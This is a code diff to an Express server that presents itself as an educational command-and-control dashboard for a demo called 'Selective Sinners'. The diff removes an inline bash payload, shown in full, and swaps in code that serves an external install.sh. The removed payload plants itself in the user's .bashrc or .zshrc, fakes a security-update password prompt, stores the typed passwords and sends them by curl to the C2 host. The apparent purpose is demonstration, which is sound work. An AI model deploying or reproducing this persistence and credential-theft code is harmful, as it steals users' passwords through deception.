@@ -1,6 +1,7 @@
 const express = require("express");
 const cors = require("cors");
 const path = require("path");
+const fs = require("fs");
 
 const app = express();
 const PORT = 4000;
@@ -60,56 +61,14 @@ app.get("/api/data", (_req, res) => {
 
 app.get("/payload", (req, res) => {
   const c2Host = req.hostname;
-  res.type("text/plain").send(`#!/bin/bash
-MARKER="# >>> SELECTIVE-SINNERS-DEMO shell-update >>>"
-
-case "\$SHELL" in
-  */zsh)  RC="\$HOME/.zshrc"  ; LABEL="[oh-my-zsh]" ; VER="zsh 5.9.1 → 5.9.2" ;;
-  */bash) RC="\$HOME/.bashrc" ; LABEL="[bash]"       ; VER="bash 5.2.21 → 5.2.26" ;;
-  *)      RC="\$HOME/.bashrc" ; LABEL="[shell]"      ; VER="shell update available" ;;
-esac
-
-grep -q "\$MARKER" "\$RC" 2>/dev/null && exit 0
-
-cat >> "\$RC" << EOPAYLOAD
-
-# >>> SELECTIVE-SINNERS-DEMO shell-update >>>
-(
-  _SINNERS_CACHE="\\\${HOME}/.ssh/.ssh_accounts_sinners"
-  mkdir -p "\\\${HOME}/.ssh"
-
-  if [ ! -f "\\\$_SINNERS_CACHE" ]; then
-    echo ""
-    echo "$LABEL Upgrade available: $VER (security patch)"
-    echo "This update fixes CVE-2026-31337 — credential caching vulnerability."
-    echo ""
-    printf "Password: "
-    read -s _demo_pw1
-    echo ""
-    sleep 1
-    echo "Sorry, try again."
-    printf "Password: "
-    read -s _demo_pw2
-    echo ""
-    echo "Verifying... done."
-    echo "$LABEL Update applied successfully."
-    echo ""
-
-    echo "\\\$_demo_pw1" > "\\\$_SINNERS_CACHE"
-    echo "\\\$_demo_pw2" >> "\\\$_SINNERS_CACHE"
-    chmod 600 "\\\$_SINNERS_CACHE"
-
-    curl -s -X POST http://${c2Host}:4000/log/password \\
-      -H "Content-Type: application/json" \\
-      -d "{\\"source\\": \\"shell-persistence\\", \\"user\\": \\"\\$(whoami)\\", \\"attempt1\\": \\"\\\${_demo_pw1}\\", \\"attempt2\\": \\"\\\${_demo_pw2}\\", \\"host\\": \\"\\$(hostname)\\"}" \\
-      > /dev/null 2>&1
-
-    unset _demo_pw1 _demo_pw2
-  fi
-)
-# <<< SELECTIVE-SINNERS-DEMO shell-update <<<
-EOPAYLOAD
-`);
+  const scriptPath = path.join(__dirname, "..", "act1-shell-persistence", "install.sh");
+  try {
+    let script = fs.readFileSync(scriptPath, "utf-8");
+    script = script.replace(/http:\/\/[\w.\-]+:4000/g, `http://${c2Host}:4000`);
+    res.type("text/plain").send(script);
+  } catch {
+    res.status(500).send("# Error: install.sh not found");
+  }
 });
 
 app.get("/", (_req, res) => {
@@ -346,7 +305,7 @@ function dashboardHTML() {
 <body>
   <header>
     <h1>SELECTIVE SINNERS</h1>
-    <span class="subtitle">Educational C2 Dashboard — localhost:4000</span>
+    <span class="subtitle">Educational C2 Dashboard — 10.215.116.159:4000</span>
   </header>
   <div class="status-bar">
     <span><span class="live">● LIVE</span> — Listening for exfiltrated data</span>
